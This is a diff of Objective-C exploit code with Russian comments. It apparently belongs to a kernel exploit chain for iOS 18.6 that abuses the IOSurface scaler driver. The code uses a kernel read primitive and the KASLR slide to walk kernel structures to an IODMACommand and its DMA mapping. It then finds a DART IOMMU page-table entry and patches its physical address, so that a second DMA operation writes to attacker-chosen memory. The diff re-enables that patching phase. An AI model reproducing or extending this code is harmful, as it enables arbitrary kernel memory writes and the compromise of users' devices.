@@ -6287,24 +6287,17 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     *(uint64_t *)(tsdZ + 8) = 1;   // async
     for (int i = 0; i < 0; i++)   // 1.9.161: churn не нужен — подмена ДО submit (фаза 1), PTE патчится после execute #1 (фаза 2); 800 валидных опов держали очередь и victim#1 не успевал исполниться
         IOConnectCallMethod(churn, 1, NULL, 0, tsdZ, KP_M2_TSD_SIZE, NULL, NULL, NULL, NULL);
-    // 1.9.178 (р.45): детерминированный src-map-fail БЕЗ гигантских dims —
-    // src с IOSurfaceMapCacheAttribute=0: create/resolve проходят, но mode-check
-    // scaler'а (0x927b6ec) требует mem-flags {1,2} → ret 0x2c2 до DVA-alloc,
-    // после dst map (w2=0), до doorbell (0x928f830) = cold-TLB + живой mapping.
-    NSMutableDictionary *spBad = [sp mutableCopy];
-    spBad[@"IOSurfaceMapCacheAttribute"] = @0;
-    IOSurfaceRef srcBad = IOSurfaceCreate((__bridge CFDictionaryRef)spBad);
-    uint32_t srcBadID = srcBad ? IOSurfaceGetID(srcBad) : srcID;
-    kpNote(r, [NSString stringWithFormat:@"  srcBad: %@ (id=%u) — MapCacheAttribute=0 для src-map-fail",
-              srcBad ? @"создан" : @"NULL (fallback srcS)", srcBadID]);
-    // victim async с ОТКАЛИБРОВАННЫМ TSD (при execute сделает DMA — но не с srcBad)
+    // 1.9.181 (р.46): map-fail на 18.6 = kernel panic ПО ДИЗАЙНУ (0x2c2 не
+    // пробрасывается → ldr по НЕмапнутому cmd → NULL deref) — srcBad/уронить-map
+    // ЗАПРЕЩЕНЫ. victim#1 = НАСТОЯЩИЙ src: валидный identity-оп, mapping кэшится
+    // НА PIPE (не op-entry). DVA потом берём прямо оттуда.
     uint8_t tsdV[0x1B0];
     memcpy(tsdV, tsdGood, sizeof(tsdV));
-    *(uint32_t *)(tsdV + 0) = srcBadID;
+    *(uint32_t *)(tsdV + 0) = srcID;
     *(uint32_t *)(tsdV + 4) = dstID;
     *(uint64_t *)(tsdV + 8) = 1;   // async
     kern_return_t avkr = IOConnectCallMethod(victim, 1, NULL, 0, tsdV, sizeof(tsdV), NULL, NULL, NULL, NULL);
-    kpNote(r, [NSString stringWithFormat:@"  victim#1 async submit (srcBad, cold-TLB): kr=0x%x — ждём dst map ок + src fail 0x2c2", avkr]);
+    kpNote(r, [NSString stringWithFormat:@"  victim#1 async submit (real src): kr=0x%x — mapping кэшируется на pipe", avkr]);
     // 1.9.147: OP-ENTRY ОРАКУЛ — surfVA из самой оп-записи scheduler'а, без портов
     // и реестра. Submit (sel1) резолвит surface ptr в op-entry (раунд 24); нашу
     // запись находим по credit=0x10 (sel10 выше), сканируем 0x21c0 на указатели,
@@ -6624,14 +6617,9 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     // жив (bit43=1 в TSD victim'а), ищем DART PTE по PA-маске 0x3FFFE000000
     // (р.33/35), патчим PA-поле с сохранением флаг-бит, второй execute (тот же
     // TSD, reuse) пишет в ctlPA.
-    // 1.9.180 ЭКСПЕРИМЕНТ: фаза 2 ОТКЛЮЧЕНА — srcBad victim#1, ждём 500мс, только
-    // маркер. Ребут = убийца в kernel'е (failing op / purge mapping'а, не наши
-    // дерефы). Выживет = наш walk бьёт по переработанному состоянию (тогда
-    // фазу 2 двигаем в окно парка сразу после submit, до 400ms-ожидания).
-    kpNote(r, @"  [P2-LESS] фаза 2 отключена: жду 500ms — если ребут, убийца в kernel'е (scaler/purge)");
-    usleep(500000);
-    kpNote(r, @"  [P2-LESS] 500ms выжили — убийца был в нашем walk, не в kernel-опе");
-    if (0 && isTable && victim != IO_OBJECT_NULL) {
+    // 1.9.181: фаза 2 ВКЛЮЧЕНА обратно — причина ребутов НЕ в walk, а в map-fail
+    // по дизайну (р.46). srcBad убран, walk по pipe-direct DVA безопасен.
+    if (isTable && victim != IO_OBJECT_NULL) {
         uint64_t wVA = kpM2TClientVA(r, isTable, victim, @"p2-victim");
         uint64_t ucVA = kpLooksLikeKernelPointer(wVA) ? kp_untag_ptr(early_kread64(wVA + 0x30)) : 0;
         uint64_t provVA = kpLooksLikeKernelPointer(ucVA) ? kp_untag_ptr(early_kread64(ucVA + 0xe8)) : 0;
@@ -6695,61 +6683,20 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         // → DVA=[mapObj+0xa0] → pageIdx=DVA>>14 → walk L0/L1/L2/leaf (valid=bit0,
         // child=(e<<4)&0x3ffffffc000) → PTE. Патч ТОЛЬКО при совпадении PA-маски.
         uint64_t cmdVA = 0, dva = 0, dvaLen = 0;
-        // 1.9.176: marker-driven поиск op-entry — БЕЗ оффсетов коллекций. Запись
-        // держит [X+0x48]==ucVA (back-ref) и/или [X+0x788]==surfVA (dst surface).
-        // Скан всех ptr в prov/pipe/sched/uc: объект с таким полем = op-entry;
-        // буфер с таким объектом внутри = массив записей. kvtophys + page-guard.
-        uint64_t entryVA = 0;
-        uint64_t schVA = kpLooksLikeKernelPointer(pipeVA) ? kp_untag_ptr(early_kread64(pipeVA + 0xb8)) : 0;
-        {
-            uint64_t hosts[4] = { ucVA, provVA, pipeVA, schVA };
-            const char *hnames[4] = { "uc", "prov", "pipe", "sched" };
-            uint32_t hlims[4] = { 0x168, 0x400, 0x400, 0x400 };
-            for (int src = 0; src < 4 && !entryVA; src++) {
-                uint64_t host = hosts[src];
-                if (!kpLooksLikeKernelPointer(host) || !surfVA) continue;
-                for (uint32_t o = 0; o + 8 <= hlims[src] && !entryVA; o += 8) {
-                    uint64_t P = kp_untag_ptr(early_kread64(host + o));
-                    if (!kpLooksLikeKernelPointer(P) || !kpSafeToRead(P)) continue;
-                    if ((uint32_t)(P & 0x3fff) + 0x798 > 0x4000) continue;
-                    if (kp_untag_ptr(early_kread64(P + 0x48)) == ucVA ||
-                        kp_untag_ptr(early_kread64(P + 0x788)) == surfVA) {
-                        entryVA = P;
-                        kpNote(r, [NSString stringWithFormat:@"  [P2] op-entry = %s+%#x → %#llx (прямой)%@",
-                                  hnames[src], o, (unsigned long long)P,
-                                  kp_untag_ptr(early_kread64(P + 0x788)) == surfVA ? @" [+0x788]=surfVA ✓" : @" [+0x48]=ucVA ✓"]);
-                        break;
-                    }
-                    if ((uint32_t)(P & 0x3fff) + 0x100 > 0x4000) continue;
-                    for (uint32_t o2 = 0; o2 + 8 <= 0x100; o2 += 8) {
-                        uint64_t E = kp_untag_ptr(early_kread64(P + o2));
-                        if (!kpLooksLikeKernelPointer(E) || !kpSafeToRead(E)) continue;
-                        if ((uint32_t)(E & 0x3fff) + 0x798 > 0x4000) continue;
-                        if (kp_untag_ptr(early_kread64(E + 0x48)) != ucVA &&
-                            kp_untag_ptr(early_kread64(E + 0x788)) != surfVA) continue;
-                        entryVA = E;
-                        kpNote(r, [NSString stringWithFormat:@"  [P2] op-entry = %s+%#x → массив %#llx[%#x] = %#llx ✓",
-                                  hnames[src], o, (unsigned long long)P, o2, (unsigned long long)E]);
-                        break;
-                    }
-                }
-            }
-        }
-        if (!entryVA) {
-            kpNote(r, @"  [P2] op-entry не найден marker-driven — умирает на completion (нужен cold-TLB рецепт)");
-        } else {
-            // cmd: dst = ep+0x790 (р.41); запасной src = ep+0x4d0 — vt-проверка обоих
-            for (uint32_t mo = 0x790; ; mo = 0x4d0) {
-                uint64_t cand = kp_untag_ptr(early_kread64(entryVA + mo));
-                if (kpLooksLikeKernelPointer(cand) && kpSafeToRead(cand)) {
-                    uint64_t cvt = kp_untag_ptr(early_kread64(cand));
-                    uint64_t cFile = cvt ? cvt - kslide2 : 0;
-                    kpNote(r, [NSString stringWithFormat:@"  [P2] cmd=[ep+%#x]=%#llx vt(file)=%#llx%@",
-                              mo, (unsigned long long)cand, (unsigned long long)cFile,
-                              (uint32_t)cFile == 0x7afa9e8 ? @" = IODMACommand ✓" : @""]);
-                    if ((uint32_t)cFile == 0x7afa9e8) { cmdVA = cand; break; }
-                }
-                if (mo == 0x4d0) break;
+        // 1.9.181 (р.46): mapping живёт НА PIPE (не op-entry!) — прямой путь к
+        // cmd БЕЗ охоты op-entry (серия 1.9.160-176 мимо была именно поэтому):
+        // [pipe+0x88+planeIdx*8] → IODMACommand (vt 0x7afa9e8) → [cmd+0x70]=mapObj
+        // → DVA=[mapObj+0xa0]. Purge-таймера нет — ходить можно и через 400мс.
+        if (kpLooksLikeKernelPointer(pipeVA)) {
+            for (uint32_t pi = 0; pi < 4 && !cmdVA; pi++) {
+                uint64_t cand = kp_untag_ptr(early_kread64(pipeVA + 0x88 + (uint64_t)pi * 8));
+                if (!kpLooksLikeKernelPointer(cand) || !kpSafeToRead(cand)) continue;
+                uint64_t cvt = kp_untag_ptr(early_kread64(cand));
+                uint64_t cFile = cvt ? cvt - kslide2 : 0;
+                kpNote(r, [NSString stringWithFormat:@"  [P2] cmd=[pipe+0x88+%u*8]=%#llx vt(file)=%#llx%@",
+                          pi, (unsigned long long)cand, (unsigned long long)cFile,
+                          (uint32_t)cFile == 0x7afa9e8 ? @" = IODMACommand ✓" : @""]);
+                if ((uint32_t)cFile == 0x7afa9e8) cmdVA = cand;
             }
         }
         if (cmdVA) {
